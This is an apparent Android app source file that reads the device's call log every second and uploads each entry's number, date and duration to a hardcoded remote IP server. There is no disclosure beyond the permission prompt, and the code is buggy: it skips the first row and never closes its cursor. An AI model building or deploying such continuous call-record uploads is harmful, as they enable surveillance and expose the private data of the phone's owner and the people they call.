package com.example.calllog;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {
    Button btnCall;
    EditText edtCall;
    Retrofit retrofit;
    RetrofitAPI retrofitApi;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, MODE_PRIVATE);

        retrofit = new Retrofit.Builder()
                //.baseUrl("http://192.168.0.44:3030")
                .baseUrl("http://61.32.218.74:28100")
                .addConverterFactory(GsonConverterFactory.create())
                .build();

         retrofitApi = retrofit.create(RetrofitAPI.class);
         task();
    }

    public void task(){
        Timer timer = new Timer();
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                try {
                    getCallHistory();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        };

        timer.schedule(timerTask, 0, 1000);
    }

    public void getCallHistory() throws JSONException {
        HashMap<String, String> list = new HashMap<>();
        //JSONObject obj = new JSONObject();
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyMMdd_HHmmss");

        long date = 0;
        String number = "";
        String duration = "";
        String dateString = "";

        String[] callList = new String[]{
                CallLog.Calls.DATE,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DURATION
        };

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, callList, null, null, null);

        if (cursor.getCount() > 1) {
            cursor.moveToFirst();

            while (cursor.moveToNext()) {

                dateString = dateFormat.format(new Date(cursor.getLong(0)));
                number = cursor.getString(1);
                duration = cursor.getString(2);

                retrofitApi.postCallList(number, dateString, duration).enqueue(new Callback<ResponseBody>() {
                    @Override
                    public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                        if(response.isSuccessful()){
                            Log.d("Sending", response.body().toString());
                        }
                    }

                    @Override
                    public void onFailure(Call<ResponseBody> call, Throwable t) {

                    }
                });
            }
        }else{
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(new Runnable(){
                @Override
                public void run(){
                    Toast.makeText(getApplicationContext(), "통화 목록이 없습니다.", Toast.LENGTH_LONG).show();
                }

            }, 0);
        }
    }
}
